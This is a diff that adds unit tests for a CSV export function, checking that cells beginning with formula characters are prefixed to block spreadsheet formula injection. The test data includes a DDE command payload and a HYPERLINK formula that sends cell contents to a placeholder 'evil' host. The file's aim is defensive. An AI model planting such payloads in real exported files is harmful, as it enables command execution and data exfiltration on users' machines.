@@ -25,6 +25,40 @@ suite('QueryManager.toDelimited', () => {
 	});
 });
 
+// S6: a cell value starting with '=', '+', '-' or '@' is interpreted as a
+// formula by Excel/LibreOffice/Sheets on open - a result value like
+// =HYPERLINK(...) or =cmd|'/C calc'!A0 must not execute on open.
+suite('QueryManager.toDelimited neutralizes formula injection', () => {
+	test('prefixes a leading =, +, - or @ with a literal quote', () => {
+		const set = {
+			columns: ['value'],
+			rows: [
+				{ value: "=cmd|'/C calc'!A0" },
+				{ value: '+1234' },
+				{ value: '-1234' }
+			]
+		};
+		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
+		assert.strictEqual(lines[1], "'=cmd|'/C calc'!A0");
+		assert.strictEqual(lines[2], "'+1234");
+		assert.strictEqual(lines[3], "'-1234");
+	});
+
+	test('the formula prefix still applies when the value also needs RFC 4180 quoting', () => {
+		// Contains a comma, so toDelimited's own quoting kicks in too - the
+		// leading quote must still be the literal first character Excel sees.
+		const set = { columns: ['value'], rows: [{ value: '=HYPERLINK("http://evil/?d="&A1,"Click")' }] };
+		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
+		assert.strictEqual(lines[1], '"\'=HYPERLINK(""http://evil/?d=""&A1,""Click"")"');
+	});
+
+	test('a plain value that merely contains, but does not start with, a formula character is untouched', () => {
+		const set = { columns: ['value'], rows: [{ value: 'Revenue=1000' }] };
+		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
+		assert.strictEqual(lines[1], 'Revenue=1000');
+	});
+});
+
 suite('DatabaseService.escapeLikePattern', () => {
 	test('escapes LIKE wildcards so user input is matched literally', () => {
 		assert.strictEqual(DatabaseService.escapeLikePattern('100%_[x]'), '100[%][_][[]x]');
